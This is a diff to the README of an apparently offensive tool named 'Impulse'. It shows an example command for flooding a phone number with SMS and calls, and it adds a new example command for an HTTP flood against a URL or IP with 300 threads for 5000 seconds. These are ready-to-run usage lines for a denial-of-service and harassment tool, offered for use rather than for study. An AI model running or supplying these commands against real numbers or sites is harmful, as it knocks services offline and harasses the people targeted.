@@ -53,6 +53,9 @@
 # :phone: Example SMS & Call flood:
 ```python3 impulse.py --method SMS --time 20 --threads 15 --target +380123456789```
 
+# :Url: Example Url/Ip flood:
+```python3 impulse.py --method HTTP --time 5000 --threads 300 --target (url)```
+
 <p align="center">
   <img src="https://i.ibb.co/KmPnV9f/Impulse-SMS.png">
 </p>
